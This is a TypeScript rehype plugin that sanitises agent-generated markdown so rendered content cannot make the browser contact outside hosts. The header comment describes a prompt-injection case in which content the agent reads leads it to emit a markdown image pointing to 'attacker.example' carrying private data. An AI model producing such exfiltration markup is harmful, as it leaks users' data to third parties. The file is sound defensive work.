import type {
  Element,
  ElementContent,
  Properties,
  Root,
  RootContent,
} from "hast";

import {
  defangHost,
  defangUrl,
  isAppUrl,
  isHttpUrl,
  isLocalImageUrl,
} from "@/core/display/defang";

/**
 * The last rehype step of every markdown renderer (components/ai-elements/
 * markdown.tsx). Agent, model and tool text is content-derived: an email or a
 * page the agent read can make it write
 *
 *   ![status](https://attacker.example/pixel.png?d=<private data>)
 *
 * and the browser fetches that the moment it renders: zero-click
 * exfiltration. So nothing in rendered markdown makes the browser contact
 * another origin by itself:
 *
 * - an image (or audio/video) from another origin becomes a line of text,
 *   "Image from attacker[.]example not loaded"; the app's own images
 *   (`/api/threads/…/artifacts/…`, `/mnt/user-data/…`) and `data:image/…`
 *   still render;
 * - elements that load or navigate by themselves (script, style, link, meta,
 *   base, iframe, object, embed…) are dropped, as raw HTML can carry them;
 * - any other URL-bearing attribute pointing elsewhere is removed, and so is
 *   an inline style that could load a URL;
 * - a link to another origin is not a live link: it renders as a button that
 *   shows the full URL and opens it (no referrer) only once the person
 *   confirms, so a link labelled "summary" is seen for what it sends. A bare
 *   URL in the text (an autolink) is the same button and reads as its real
 *   URL: "https://a.example/x", not "hxxps://a[.]example/x". Nothing is
 *   fetched either way; the confirm is the boundary, and an agent's answer
 *   is meant to carry links the person can use. The app's own links are
 *   untouched;
 * - only http(s) links become that button. Any other scheme (javascript:,
 *   data:, vbscript:, file:…) is inert text: there is nothing safe to open.
 *
 * The Content-Security-Policy (next.config.js) is the second line: it blocks
 * any outside image or connection this misses.
 */

/** Removed outright: each loads, runs or navigates without a click. */
const DROPPED_TAGS = new Set([
  "script",
  "style",
  "link",
  "meta",
  "base",
  "iframe",
  "frame",
  "frameset",
  "object",
  "embed",
  "applet",
  "portal",
  "noscript",
]);

/** Replaced by a "not loaded" line when their source is elsewhere. */
const MEDIA_TAGS = new Set(["img", "image", "video", "audio", "picture"]);

/** Attributes the browser fetches (or navigates to) by itself. */
const FETCHING_ATTRS = [
  "src",
  "srcSet",
  "poster",
  "data",
  "background",
  "lowsrc",
  "dynsrc",
  "xLinkHref",
  "action",
  "formAction",
  "manifest",
  "icon",
] as const;

/** A style value that could load a URL (url(), image-set(), @import, escapes). */
const RISKY_STYLE = /url\s*\(|image-set|image\s*\(|@import|expression|\\/i;

function asString(v: Properties[string]): string | undefined {
  if (typeof v === "string") return v;
  if (Array.isArray(v)) return v.join(" ");
  return undefined;
}

/** Every URL in a srcset ("a.png 1x, b.png 2x"). */
function srcsetUrls(v: string): string[] {
  return v
    .split(",")
    .map((part) => part.trim().split(/\s+/)[0] ?? "")
    .filter(Boolean);
}

function textOf(node: ElementContent | Element): string {
  if (node.type === "text") return node.value;
  if (node.type === "element") return node.children.map(textOf).join("");
  return "";
}

function notLoaded(kind: "Image" | "Media", url: string): Element {
  const host = defangHost(url);
  return {
    type: "element",
    tagName: "span",
    properties: {
      className: ["text-muted-foreground", "text-xs", "italic"],
      dataBlockedMedia: "",
      title: defangUrl(url),
    },
    children: [
      {
        type: "text",
        value: host ? `${kind} from ${host} not loaded` : `${kind} not loaded`,
      },
    ],
  };
}

/** The source of a media element, or of its first <source> child. */
function mediaSources(el: Element): string[] {
  const own = [
    asString(el.properties.src),
    asString(el.properties.xLinkHref),
    asString(el.properties.href),
    asString(el.properties.poster),
  ].filter((v): v is string => !!v);
  const set = asString(el.properties.srcSet);
  if (set) own.push(...srcsetUrls(set));
  for (const child of el.children) {
    if (child.type === "element") own.push(...mediaSources(child));
  }
  return own;
}

/** Remove every fetching attribute that points elsewhere, and risky styles. */
function stripAttributes(el: Element) {
  const p = el.properties;
  for (const attr of FETCHING_ATTRS) {
    const v = asString(p[attr]);
    if (v === undefined) continue;
    const urls = attr === "srcSet" ? srcsetUrls(v) : [v];
    if (urls.some((u) => !isLocalImageUrl(u))) delete p[attr];
  }
  delete p.ping;
  const style = asString(p.style);
  if (style && RISKY_STYLE.test(style)) delete p.style;
  // href fetches on anything but a link (svg <use>/<image>, <link>).
  if (el.tagName !== "a" && el.tagName !== "area") {
    const href = asString(p.href);
    if (href && !isAppUrl(href)) delete p.href;
  }
}

/** Control and format characters (bidi overrides, zero-width…): out of
 *  every outside link's label, so it reads as what it opens. */
const INVISIBLE = /[\p{Cc}\p{Cf}]/gu;

function stripInvisible(node: ElementContent) {
  if (node.type === "text") node.value = node.value.replace(INVISIBLE, "");
  else if (node.type === "element") node.children.forEach(stripInvisible);
}

/** A hostname, compared without a leading "www.". */
function bareHost(host: string): string {
  return host.toLowerCase().replace(/^www\./, "");
}

/** File names read as domains by shape ("report.pdf"); not treated as one. */
const FILE_EXT =
  /\.(pdf|md|txt|png|jpe?g|gif|svg|html?|csv|json|ya?ml|docx?|xlsx?|pptx?|py|[jt]sx?)$/i;

/** The host a label NAMES when it reads as a URL or a domain, else null. */
function labelHost(label: string): string | null {
  const text = label.trim();
  if (/\s/.test(text)) return null;
  try {
    if (/^https?:\/\//i.test(text)) return new URL(text).hostname;
    const domain = /^([a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,24})(\/\S*)?$/i.exec(
      text,
    );
    if (domain && !FILE_EXT.test(domain[1]!))
      return new URL(`http://${domain[1]}`).hostname;
  } catch {
    return null;
  }
  return null;
}

/** The URL as it reads truthfully: no user info ("good.com@evil.com" goes
 *  to evil.com), no invisible characters. */
function truthfulUrl(url: URL): string {
  return `${url.protocol}//${url.host}${url.pathname}${url.search}${url.hash}`.replace(
    INVISIBLE,
    "",
  );
}

/**
 * An outside link loses its href: the URL moves to `data-external-href`,
 * which the renderer turns into a button that shows the full URL and opens it
 * only when the person confirms (components/workspace/citations/
 * external-link.tsx). A link whose text is its URL (a bare URL in the text)
 * shows that URL as it is. A label that reads as a URL or domain for a
 * DIFFERENT host than the link opens ("[https://good.example](https://
 * evil.example)", or user info: "https://good.example@evil.example/") is
 * replaced by the URL the link really opens. Labels lose invisible
 * characters. A link to any scheme but http(s) is inert text.
 */
function guardLink(el: Element) {
  const href = asString(el.properties.href);
  if (!href || isAppUrl(href)) return;
  if (/^\s*(mailto|tel):/i.test(href)) return; // these fetch nothing
  delete el.properties.href;
  delete el.properties.target;
  if (!isHttpUrl(href)) {
    el.tagName = "span";
    el.properties.dataInertLink = "";
    return;
  }
  el.properties.dataExternalHref = href;
  const url = new URL(href);
  const label = textOf(el);
  const named = labelHost(label);
  if (
    url.username ||
    url.password ||
    (named !== null && bareHost(named) !== bareHost(url.hostname))
  ) {
    el.children = [{ type: "text", value: truthfulUrl(url) }];
    return;
  }
  if (label.trim() === href.trim()) {
    el.children = [{ type: "text", value: href.trim() }];
  }
  el.children.forEach(stripInvisible);
}

function guardChildren(parent: Root | Element) {
  const out: (RootContent | ElementContent)[] = [];
  for (const node of parent.children) {
    if (node.type !== "element") {
      out.push(node);
      continue;
    }
    if (DROPPED_TAGS.has(node.tagName)) continue;
    if (MEDIA_TAGS.has(node.tagName)) {
      const outside = mediaSources(node).find((u) => !isLocalImageUrl(u));
      if (outside) {
        out.push(
          notLoaded(node.tagName === "img" ? "Image" : "Media", outside),
        );
        continue;
      }
    }
    if (
      node.tagName === "input" &&
      asString(node.properties.src) &&
      !isLocalImageUrl(asString(node.properties.src)!)
    ) {
      out.push(notLoaded("Image", asString(node.properties.src)!));
      continue;
    }
    stripAttributes(node);
    guardChildren(node);
    if (node.tagName === "a" || node.tagName === "area") guardLink(node);
    out.push(node);
  }
  parent.children = out;
}

/** rehype plugin: see the module comment. */
export function rehypeContentUrlGuard() {
  return (tree: Root) => {
    guardChildren(tree);
  };
}
